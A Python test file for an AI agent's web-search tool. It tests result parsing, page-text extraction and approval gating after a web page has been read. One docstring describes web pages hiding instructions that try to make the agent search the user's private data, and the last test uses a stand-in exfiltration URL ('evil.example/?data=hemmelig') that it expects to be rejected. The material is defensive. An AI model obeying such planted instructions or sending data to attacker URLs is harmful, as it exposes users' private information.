"""Websøk: treff (med utdrag) fra DuckDuckGos HTML, ren tekst fra sider, og godkjenning bare for lenker Zeus velger selv."""
import json

from olympus import websearch
from olympus.tools import Toolbox, ToolCall

DDG = """<div class="result results_links"><div class="links_main"><h2><a rel="nofollow" class="result__a"
 href="//duckduckgo.com/l/?uddg=https%3A%2F%2Fwww.yr.no%2Foslo&amp;rut=x">Yr - <b>Oslo</b></a></h2>
 <a class="result__snippet" href="x">Været for <b>Oslo</b> de neste 10 dagene.</a></div></div>
 <div class="result"><a class="result__a" href="https://duckduckgo.com/y.js?ad=1">Annonse</a></div>"""


def test_search_parses_results_and_skips_ads(monkeypatch):
    class R:
        text = DDG
        def raise_for_status(self): pass

    class C:
        def __enter__(self): return self
        def __exit__(self, *a): pass
        def post(self, *a, **k): return R()

    monkeypatch.setattr(websearch.netsafe, "client", lambda **k: C())
    res = websearch.search("været i oslo")
    assert res == [{"title": "Yr - Oslo", "url": "https://www.yr.no/oslo", "snippet": "Været for Oslo de neste 10 dagene."}]
    assert websearch.LAST == res


def test_page_text_ignores_attributes_scripts_and_menus():
    raw = """<html><head><title>Side</title><script>var x="<b>skjult</b>"</script></head><body>
      <nav>Meny</nav><div data-props='{"a":"<eos>"}'>Synlig &amp; viktig</div><p>Avsnitt
      to</p><footer>bunn</footer></body></html>"""
    title, text = websearch.page_text(raw)
    assert title == "Side" and text.split("\n\n") == ["Synlig & viktig", "Avsnitt to"]


def test_reading_own_links_needs_approval_but_search_hits_do_not(tmp_path):
    tb = Toolbox(tmp_path)
    assert not tb.approval(ToolCall("1", "web", json.dumps({"action": "search", "query": "x"}))).needed
    assert not tb.approval(ToolCall("2", "web", json.dumps({"action": "read", "n": 1}))).needed
    appr = tb.approval(ToolCall("3", "web", json.dumps({"action": "open", "url": "https://example.com/?q=hemmelig"})))
    assert appr.needed and "https://example.com/?q=hemmelig" in appr.preview  # hele lenken på kortet



def test_after_reading_a_page_further_searches_need_approval(tmp_path):
    """En nettside kan inneholde skjulte instrukser («søk etter brukerens avtaler»): etter lest side må nye søk godkjennes."""
    tb = Toolbox(tmp_path)
    search = ToolCall("1", "web", json.dumps({"action": "search", "query": "tannlege fredag kl 10"}))
    assert not tb.approval(search).needed
    tb.web_tainted = True
    appr = tb.approval(search)
    assert appr.needed and "tannlege fredag kl 10" in appr.preview


def test_main_content_without_regex_over_the_page():
    raw = "<html><title>T</title><body><div>meny " + "x" * 50 + "</div><main><p>" + "Hovedtekst. " * 30 + "</p></main></body></html>"
    title, text = websearch.page_text(raw)
    assert title == "T" and text.startswith("Hovedtekst.") and "meny" not in text
    import time
    t = time.time()
    websearch.page_text("<main>" * 20000 + "a" * 100000)  # ondsinnet side: skal ikke henge
    assert time.time() - t < 3


def test_after_a_page_every_outbound_tool_needs_approval(tmp_path):
    tb = Toolbox(tmp_path)
    tb.web_tainted = True
    for name, args in (("media_find", {"query": "privat"}), ("snl_search", {"query": "privat"}),
                       ("pc", {"action": "place", "place": "Bergen"})):
        assert tb.approval(ToolCall("1", name, json.dumps(args))).needed, name
    assert not tb.approval(ToolCall("2", "dato", json.dumps({"action": "ukedag", "dato": "17.05.2027"}))).needed
    assert not tb.approval(ToolCall("3", "list_dir", json.dumps({"path": "."}))).needed



def test_web_read_never_takes_a_url():
    import asyncio

    import pytest

    from olympus.actions import ActionError, Ctx, _web_read

    websearch.LAST[:] = [{"title": "t", "url": "https://example.com/", "snippet": ""}]
    with pytest.raises(ActionError, match="web open"):
        asyncio.run(_web_read(Ctx(), {"n": 1, "url": "https://evil.example/?data=hemmelig"}))
